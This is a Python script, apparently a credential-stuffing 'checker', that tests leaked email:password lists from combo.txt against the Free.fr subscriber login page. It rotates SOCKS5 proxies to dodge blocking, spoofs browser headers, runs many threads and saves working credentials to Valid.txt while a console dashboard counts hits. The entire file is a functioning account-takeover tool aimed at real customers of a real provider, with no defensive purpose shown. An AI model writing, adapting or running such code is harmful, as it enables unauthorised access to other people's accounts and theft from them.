import requests
import os
import time
import shutil
from threading import Lock, Thread, Semaphore
import sys
import urllib3
import colorama
import ctypes
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama.init(autoreset=False)

print_lock = Lock()
stats = {"valid": 0, "bad": 0, "total": 0, "retries": 0}
is_running = False

ASCII_ART = r""" 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠻⣆⠀⠀⠀⠘⠀⠐⠀⠀⠀⡀⠀
⠀⠀⡶⢤⡀⠀⠀⠀⢀⡇⡄⠈⢳⡄⢀⠁⠀⠀⠀⠀⠀⠇⠀
⠀⢠⡇⡄⢙⢦⣀⣀⣼⠁⠂⠀⠀⠙⣦⠀⠀⠀⠀⠀⠠⠀⠀
⠀⠘⡇⡇⠀⠁⡍⠁⠀⠀⠈⡁⠂⠀⢌⠳⡄⠀⠀⠀⠐⠀⠀
⠀⠰⡇⢀⠀⡐⠁⠀⠀⠀⠀⠀⢀⡴⣋⡄⠹⣆⠀⢠⠀⠀⠀
⠀⠀⣗⠈⢅⣀⣀⣀⡀⠀⠀⠀⠛⠛⠤⠤⠤⡸⣆⣠⠟⢲⡄
⠀⠀⣿⠀⠰⠒⣺⠟⠁⢀⣠⠤⠶⡄⡁⠀⢀⠆⢹⠁⣠⠞⠁
⠀⠀⢻⡀⢀⠞⠑⠒⢄⢣⡀⠀⠀⡇⠈⠉⠀⣠⣾⡜⠃⠀⠀
⢀⣤⣼⣇⠈⠠⠤⠄⠊⠀⠑⠤⢠⣃⣠⠴⢛⡿⠋⠀⠀⠀⠀
⠸⢤⣄⣈⡓⡦⠤⠤⠤⠴⠖⠚⠋⠉⠀⢸⡍⠄⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠉⠉⠛⠛⠒⢷⠀⠀⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡃⠀⠀⠀⠀⠀⠘⡃⠀⠀⠀⠀⠀
               a d m i n ~ @ u p d h 2"""

LIGHT_BLUE = "\033[96m"
WHITE = "\033[97m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def set_console_title(title):
    if os.name == 'nt':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except Exception:
            pass


def get_width():
    try:
        return shutil.get_terminal_size((80, 20)).columns
    except Exception:
        return 80


def print_centered(text, color=None):
    width = get_width()
    for line in text.splitlines():
        padding = max((width - len(line)) // 2, 0)
        if color:
            print(" " * padding + color + line + RESET)
        else:
            print(" " * padding + line)


def print_header():
    print_centered(ASCII_ART, LIGHT_BLUE)
    print()


def render_stats(total_combos, start_time):
    elapsed = time.time() - start_time
    checked = stats["total"]
    cpm = int((checked / elapsed) * 60) if elapsed > 1 else 0

    line = (
        f"{WHITE}Valid: {GREEN}{stats['valid']}{WHITE} | "
        f"{WHITE}Bad: {RED}{stats['bad']}{WHITE} | "
        f"{WHITE}Retries: {YELLOW}{stats['retries']}{WHITE} | "
        f"{WHITE}CPM: {WHITE}{cpm}{WHITE} | "
        f"{WHITE}Progress: {WHITE}{checked}/{total_combos}{RESET}"
    )
    visible_len = (
        len("Valid: ") + len(str(stats['valid'])) +
        len(" | Bad: ") + len(str(stats['bad'])) +
        len(" | Retries: ") + len(str(stats['retries'])) +
        len(" | CPM: ") + len(str(cpm)) +
        len(" | Progress: ") + len(str(checked)) + 1 + len(str(total_combos))
    )
    width = get_width()
    padding = max((width - visible_len) // 2, 0)
    print(" " * padding + line)


def ui_loop(total_combos, start_time):
    global is_running
    while is_running:
        try:
            title_str = f"Free.fr | Valid: {stats['valid']} | Bad: {stats['bad']} | Retries: {stats['retries']}"
            set_console_title(title_str)
            with print_lock:
                sys.stdout.write("\033[?25l")
                sys.stdout.write("\033[2J\033[H")
                print_header()
                render_stats(total_combos, start_time)
                sys.stdout.flush()
        except Exception:
            pass
        time.sleep(0.3)


def format_proxy(proxy_str):
    p = proxy_str.split(':')
    if len(p) == 4:
        return f"socks5://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    elif len(p) == 2:
        return f"socks5://{p[0]}:{p[1]}"
    return None


def check_login(combo, proxies, proxy_index, sem):
    global stats
    email, password = combo.split(":", 1)
    url = "https://subscribe.free.fr/login/do_login.pl"

    error_retries = 0
    bad_retries = 0
    max_error_retries = 2
    max_bad_retries = 1

    while True:
        try:
            session = requests.Session()
            session.verify = False

            if proxies:
                raw_proxy = proxies[proxy_index % len(proxies)]
                proxy_url = format_proxy(raw_proxy)
                if proxy_url:
                    session.proxies = {"http": proxy_url, "https": proxy_url}

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'Referer': 'https://subscribe.free.fr/login/'
            }

            session.get("https://subscribe.free.fr/login/", headers=headers, timeout=10)

            payload = {'login': email, 'pass': password}
            response = session.post(url, data=payload, headers=headers, timeout=12, allow_redirects=False)

            target = response.headers.get('Location', '').lower()

            with print_lock:
                if response.status_code == 302 and any(x in target for x in ['home.pl', 'console', 'moncompte']):
                    stats["valid"] += 1
                    stats["total"] += 1
                    with open("Valid.txt", "a") as f:
                        f.write(f"{email}:{password}\n")
                    break
                else:
                    if bad_retries < max_bad_retries:
                        bad_retries += 1
                        stats["retries"] += 1
                        proxy_index += 1
                        continue
                    else:
                        stats["bad"] += 1
                        stats["total"] += 1
                        break

        except Exception:
            if error_retries < max_error_retries:
                error_retries += 1
                stats["retries"] += 1
                proxy_index += 1
                time.sleep(0.5)
                continue
            else:
                with print_lock:
                    stats["bad"] += 1
                    stats["total"] += 1
                break

    sem.release()


def start_checker():
    global is_running
    if not os.path.exists("combo.txt"):
        print("combo.txt missing")
        return

    combos = [l.strip() for l in open("combo.txt", "r", encoding="utf-8") if ":" in l]
    proxies = [l.strip() for l in open("proxies.txt", "r", encoding="utf-8")] if os.path.exists("proxies.txt") else []

    clear()

    if not proxies:
        print(f"{LIGHT_BLUE}Warning: Running without proxies!{RESET}")

    thread_count = int(input("[?] Threads: "))

    is_running = True
    start_time = time.time()
    clear()

    Thread(target=ui_loop, args=(len(combos), start_time), daemon=True).start()

    sem = Semaphore(thread_count)
    for i, combo in enumerate(combos):
        sem.acquire()
        Thread(target=check_login, args=(combo, proxies, i, sem), daemon=True).start()

    while stats["total"] < len(combos):
        time.sleep(1)
    is_running = False
    time.sleep(0.4)

    with print_lock:
        sys.stdout.write("\033[2J\033[H")
        print_header()
        render_stats(len(combos), start_time)
        print()
        print_centered("--- Finished ---", LIGHT_BLUE)
        sys.stdout.write("\033[?25h")
        sys.stdout.flush()


if __name__ == "__main__":
    start_checker()